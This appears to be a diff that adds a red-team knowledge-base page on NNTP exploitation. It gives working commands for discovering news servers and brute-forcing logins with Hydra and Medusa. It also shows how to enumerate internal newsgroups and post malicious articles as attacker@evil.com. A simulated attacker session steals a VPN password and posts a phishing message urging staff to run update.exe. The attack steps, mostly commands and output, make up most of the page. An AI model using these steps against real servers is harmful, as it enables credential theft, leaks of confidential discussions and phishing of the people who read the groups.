@@ -1,0 +1,213 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">NNTP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Email & Messaging Services</strong> • Focus: <strong>NNTP Abuse & Unauthorized Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    NNTP (Network News Transfer Protocol, TCP/119 and 563 with SSL) is used for 
+    reading and posting Usenet or newsgroup messages. Attackers exploit NNTP via 
+    weak authentication, brute-force logins, unauthorized article posting, and 
+    vulnerable server implementations. Misconfigured NNTP services can leak 
+    sensitive discussion groups or allow spamming and phishing campaigns. 
+    In Red Team operations, NNTP can be abused to pivot through legacy 
+    communication infrastructure, spread misinformation, or steal confidential 
+    discussions.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak Authentication:</strong> Many servers accept basic/plaintext logins.</li>
+    <li><strong>No Encryption:</strong> TCP/119 sends credentials in cleartext if not using SSL/TLS.</li>
+    <li><strong>Brute Force Exposure:</strong> Common usernames/passwords often valid.</li>
+    <li><strong>Article Injection:</strong> Attackers can post spam, phishing, or malicious content.</li>
+    <li><strong>Information Disclosure:</strong> Internal discussion groups may leak sensitive info.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify NNTP service on TCP/119 or 563.</li>
+    <li><strong>Banner Grabbing:</strong> Collect version info (e.g., INN, DNEWS, Exchange NNTP).</li>
+    <li><strong>Brute Force:</strong> Attack plaintext AUTH with Hydra/Ncrack.</li>
+    <li><strong>Enumeration:</strong> LIST available groups and fetch articles.</li>
+    <li><strong>Exploitation:</strong> Post unauthorized articles or extract sensitive messages.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint NNTP service.</li>
+    <li>Check for authentication or anonymous access.</li>
+    <li>Attempt brute-force login with Hydra or Medusa.</li>
+    <li>Enumerate groups and read messages.</li>
+    <li>Exploit posting capabilities to inject malicious articles.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p119,563 -sV [target]                 # Scan NNTP
+nc [target] 119                             # Banner grab
+
+# ------------------------------
+# Authentication Test
+# ------------------------------
+telnet [target] 119
+AUTHINFO USER testuser
+AUTHINFO PASS testpass
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -L users.txt -P passwords.txt nntp://[target]
+medusa -h [target] -U users.txt -P passwords.txt -M nntp
+
+# ------------------------------
+# Group Enumeration
+# ------------------------------
+telnet [target] 119
+LIST
+GROUP comp.security
+ARTICLE 1
+
+# ------------------------------
+# Post Malicious Content
+# ------------------------------
+telnet [target] 119
+POST
+From: attacker@evil.com
+Subject: Important Update
+Newsgroups: corp.announcements
+
+Malicious payload here
+.
+QUIT
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p119 192.168.1.50 -sV
+hydra -L users.txt -P rockyou.txt nntp://192.168.1.50
+telnet 192.168.1.50 119
+LIST
+GROUP internal.it
+ARTICLE 3
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p119 192.168.1.50 -sV
+PORT    STATE SERVICE VERSION
+119/tcp open  nntp    InterNetNews NNRP server INN 2.6.0
+
+[ saide ~ ]$ nc 192.168.1.50 119
+200 news.corp.local InterNetNews NNRP server ready (posting ok).
+
+[ saide ~ ]$ telnet 192.168.1.50 119
+AUTHINFO USER alice
+381 Password required
+AUTHINFO PASS summer2025
+281 Authentication accepted
+
+[ saide ~ ]$ LIST
+215 list of newsgroups follows
+internal.it.support 000000001 000000010 y
+internal.hr.updates 000000001 000000005 y
+
+[ saide ~ ]$ GROUP internal.it.support
+211 10 1 10 internal.it.support
+
+[ saide ~ ]$ ARTICLE 3
+From: admin@corp.local
+Subject: VPN Access Update
+Body: New VPN password is "CorpVPN2025!"
+
+[+] Sensitive credentials leaked via NNTP group
+
+[ saide ~ ]$ POST
+From: attacker@evil.com
+Subject: Urgent Security Patch
+Newsgroups: internal.it.support
+Body: Please run this attached update.exe immediately
+.
+240 Article posted successfully
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample NNTP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Banner Grab
+200 news.corp.local InterNetNews NNRP server ready (posting ok).
+
+# Brute Force Result
+User: alice
+Pass: summer2025
+
+# Group Enumeration
+internal.it.support
+internal.hr.updates
+
+# Sensitive Article
+Subject: VPN Access Update
+Password: CorpVPN2025!
+
+# Proof of Exploitation
+Attacker posted malicious article in internal group
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-nntp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting NNTP
+      </a>
+    </li>
+    <li>
+      <a href="https://www.rfc-editor.org/rfc/rfc3977" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        RFC 3977 – Network News Transfer Protocol
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Brute force → Group enumeration → Data theft → Malicious posting.</li>
+  </ul>
+</section>
